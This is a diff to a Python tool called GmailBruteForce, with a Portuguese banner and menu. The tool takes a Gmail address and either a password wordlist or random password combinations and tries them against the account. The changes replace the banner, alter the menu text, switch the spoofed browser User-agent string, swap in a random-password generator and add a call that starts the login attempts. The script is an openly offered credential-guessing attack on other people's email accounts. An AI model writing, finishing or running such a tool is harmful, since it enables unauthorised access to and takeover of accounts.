@@ -41,18 +41,20 @@ class GmailBruteForce():
                     print(("\033[1;31msorry %s " % user + " -> %s \033[1;m" % password ))
 
 print('''
-	                        
- __   __ __   __  o |   
-(__| |  )  ) (__( | |_, 
- __/                    
+	==================================
+	|      brute force gmail         |
+	|--------------------------------|
+	|  versão está em teste          |
+	| Por Gilmar Filho               | 
+	|--------------------------------|
 	''')
 
 instance = GmailBruteForce()
 
 do = input('''
 		Choose any number ?
-		1 - Gmail ( Normal com sua  wordlsit ) 
-		2-  Gmail ( combinação de senha )
+		1 - Gmail ( Normal com wordlsit) 
+		2-  Gmail (Combinação de senha)
                 
 		
 		==> ''')
@@ -60,7 +62,7 @@ do = input('''
 if do == '1':
     user = input("gmail : ")
     senha = input("sua wordlsit : ")
-    headers = [('User-agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36')]
+    headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]
 
     instance.accounts.append(user)
     instance.get_pass_list(senha)
@@ -77,4 +79,6 @@ if do == '2':
 
     instance.accounts.append(user)
     #a função get_pass_list, nao serve para o ramdom, pois ela exige que abra uma wordlist
-    instance.get_no_pass_list(senha)
+    instance.get_pass_random(senha)
+
+    instance.try_gmail()
